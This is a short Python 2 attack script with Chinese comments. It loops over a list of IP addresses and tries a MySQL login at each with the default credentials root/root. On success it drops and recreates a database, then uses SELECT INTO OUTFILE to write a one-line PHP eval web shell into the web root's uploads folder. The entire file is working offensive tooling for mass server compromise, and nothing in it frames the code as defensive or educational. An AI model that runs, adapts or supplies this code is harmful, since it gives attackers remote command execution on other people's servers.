#coding=utf-8
#author=Blus
import MySQLdb
 
def mysql_connect1(ip,m_user,m_password,shell_url,shell_content):
    #尝试数据库连接
    try:
        conn=MySQLdb.connect(host=ip,user=m_user,passwd=m_password,db='',port=3306)
        print "连接成功"
        cur=conn.cursor()
        #若数据库连接成功，开始写马
        try:
           #如果有重名数据库则删除该数据库
            cur.execute('DROP database IF EXISTS `A123456666`;')
            cur.execute('create database A123456666;')
        except:
            print "数据库创建错误"
            return
        cur.execute('use A123456666;')
 
        try:
            sql_shell="SELECT '{}' into outfile '{}';".format(shell_content ,shell_url)
            cur.execute(sql_shell)
            print "小马创建成功"
        except:
            print "小马创建失败"
            return
        cur.close()
    except MySQLdb.Error,e:
        print "Mysql_Error: %d: %s" % (e.args[0], e.args[1])
        return
 
if __name__ == "__main__":
 
    fp_ip=open('ip.txt')
 
    shell_url = '/var/www/html/uploads/shell5.php'
    shell_content = '<?php eval($_POST[cmd]); ?>'
 
    user = "root"
    password = "root"
 
    for ip in fp_ip.readlines():
        fp4=ip.replace('\r',"").replace('\n',"")
        # url=str(fp5)
        print fp4+ " 检测中： "
        mysql_connect1(ip,user,password,shell_url,shell_content)
 
    print '检测结束'